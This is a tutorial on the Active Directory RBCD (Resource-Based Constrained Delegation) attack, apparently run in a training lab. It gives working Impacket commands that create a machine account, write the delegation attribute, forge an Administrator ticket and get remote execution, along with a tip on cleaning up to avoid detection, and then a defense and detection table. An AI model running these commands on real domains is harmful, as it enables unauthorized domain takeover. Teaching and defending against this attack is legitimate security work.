# Active Directory 101: RBCD (Resource-Based Constrained Delegation)
*Advanced Kerberos Delegation Attack*

---

## What is RBCD?

<div class="key-concept" markdown="1">
**Resource-Based Constrained Delegation**

- Allows a **service** to impersonate **any user** to access specific resources
- Uses Kerberos **S4U2Self** and **S4U2Proxy** extensions
- Configured via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
</div>

Resource-Based Constrained Delegation represents a sophisticated attack technique that exploits legitimate Kerberos functionality to achieve privilege escalation within Active Directory environments.

### RBCD Participants

| Role | Description |
|------|-------------|
| **USER** | Wants to access a service |
| **SERVICE A** | Intermediary service |
| **RESOURCE B** | Target resource |

<div class="warning-box" markdown="1">
**Attack Vector:** If we can control Service A or modify the delegation settings, we can impersonate any user to access Resource B!
</div>

---

## How RBCD Works

Understanding the normal RBCD flow provides crucial context for exploitation techniques:

### Normal RBCD Flow

The legitimate delegation process involves three straightforward steps. First, a user sends a Ticket Granting Service (TGS) request to Service A. Then Service A requests a TGS for Resource B on behalf of the original user. Finally, Service A accesses Resource B while impersonating the user's identity.

This mechanism was designed to enable legitimate service-to-service authentication while maintaining user context throughout the process.

### BloodHound Detection

<div class="bloodhound-note" markdown="1">
**BloodHound Edge:** "GenericAll" on Computer Object
</div>

## Attack Prerequisites

Successful RBCD attacks require specific permissions or access levels within the target environment:

### What You Need

<div class="prerequisite-box" markdown="1">
**Two Attack Paths:**

- **Option 1:** Control of a computer object listed in the target's `msDS-AllowedToActOnBehalfOfOtherIdentity`
- **Option 2 (Most Common):** Write permissions on the target computer's AD object

The second option proves significantly more common in real-world environments due to widespread permission misconfigurations.

<div class="warning-box" markdown="1">

## RBCD Attack Steps

### Six-Step Attack Process

| Step | Action | Description |
|------|--------|-------------|
| **0** | **Create Computer** | Add machine account to domain (default: 10 per user) |
| **1** | **Modify Attribute** | Add our computer to target's msDS-AllowedToActOnBehalfOfOtherIdentity |
| **2** | **Request TGT** | Get TGT for our compromised computer |
| **3** | **S4U2Self** | Request TGS for privileged user to our computer |
| **4** | **S4U2Proxy** | Request TGS for privileged user to target computer |
| **5** | **Execute** | Use TGS for privilege escalation (e.g., SMBexec as Domain Admin) |

The ultimate objective involves executing commands as Domain Administrator on the target system, effectively achieving complete compromise through carefully orchestrated Kerberos protocol abuse.

## Understanding S4U Protocol

The technical foundation of RBCD attacks relies on two specific Kerberos extensions that were originally designed for legitimate delegation scenarios:

### S4U Protocol Components

| Component | Description | Purpose |
|-----------|-------------|---------|
| **S4U2Self** | "Service for User to Self" | Service requests a TGS for any user to itself |
| **S4U2Proxy** | "Service for User to Proxy" | Service uses previous TGS to request access to another service |
| **Result** | Complete User Impersonation | Service can now act as any user on target resource |

### Technical Flow

```bash
# S4U2Self: "I need a ticket for Administrator to myself"
KDC: "Here's a TGS for Administrator@domain → EVILCOMPUTER$"

# S4U2Proxy: "I need a ticket for Administrator to target service"  
KDC: "Here's a TGS for Administrator@domain → TARGET/cifs"

# Result: We can now access TARGET as Administrator!
```

The beauty of this attack lies in its abuse of legitimate Kerberos functionality. From the Key Distribution Center's perspective, all requests appear normal and authorized.

## RBCD Attack Execution

### Step 0: Create Machine Account

```bash
# Step 0: Create a machine account (optional - we can create 10 by default)
proxychains addcomputer.py sevenkingdoms.local/stannis.baratheon:Drag0nst0ne \
    -method LDAPS -computer-name EVILCOMPUTER$ -computer-pass EvilPass123!
```

Most Active Directory environments allow domain users to create up to 10 machine accounts by default, providing attackers with the necessary foundation for RBCD attacks.

<div class="success-box" markdown="1">
**Result:** We now have a controlled computer account: EVILCOMPUTER$
</div>

### Step 1: Configure Delegation

```bash
# Add our computer to target's delegation attribute
proxychains rbcd.py sevenkingdoms.local/stannis.baratheon:Drag0nst0ne \
    -delegate-from EVILCOMPUTER$ -delegate-to KINGSLANDING$ -action write
```

### Step 2: S4U Attack

```bash
# Perform complete S4U2Self + S4U2Proxy attack
proxychains getST.py sevenkingdoms.local/EVILCOMPUTER$:EvilPass123! \
    -spn cifs/kingslanding.sevenkingdoms.local \
    -impersonate Administrator -dc-ip kingslanding.sevenkingdoms.local
```

### Step 3: Use the Ticket

```bash
# Export the ticket and use it for execution
export KRB5CCNAME=Administrator.ccache
proxychains wmiexec.py sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local \
    -k -no-pass
```

<div class="success-box" markdown="1">
**Success!** We now have Domain Administrator access to the target system!
</div>

## RBCD Defense Strategies

### Defense Categories

| Defense Type | Actions | Monitoring |
|--------------|---------|------------|
| **Permission Hardening** | Audit GenericAll permissions, Implement least privilege, Regular reviews | BloodHound queries |
| **Monitoring** | msDS-AllowedToActOnBehalfOfOtherIdentity changes, Machine account creation alerts | Event logs |
| **Configuration** | Reduce machine account quota, Protected Users group, Tier 0 architecture | Group Policy |
| **Detection** | Event ID 4742/4738, Unusual S4U TGS requests | SIEM alerts |

<div class="success-box" markdown="1">
**Key Defense:** Regularly audit and restrict write permissions on computer objects
</div>

## Pro Tips

Security professionals should use BloodHound extensively, as GenericAll edges are common and often overlooked by defenders. Target high-value systems like Domain Controllers and critical servers first to maximize impact. Always clean up by removing delegation settings to avoid detection during real-world engagements.

RBCD attacks work particularly well when combined with other techniques such as Kerberoasting and ASREPRoasting. Test machine account quotas early in assessments, as the default limit of 10 per user may be restricted in hardened environments.

---

## Real-World Impact

RBCD attacks prove particularly effective in enterprise environments for several reasons:

**Common Misconfigurations** plague many organizations where excessive computer object permissions exist due to poor access control practices. **Kerberos Legitimacy** means S4U requests appear as normal Kerberos activity to monitoring systems, making detection challenging. **High Impact** provides a direct path to Domain Admin privileges from seemingly limited initial access. **Difficult Detection** occurs because legitimate delegation mechanisms make it hard to distinguish malicious activity from normal operations.
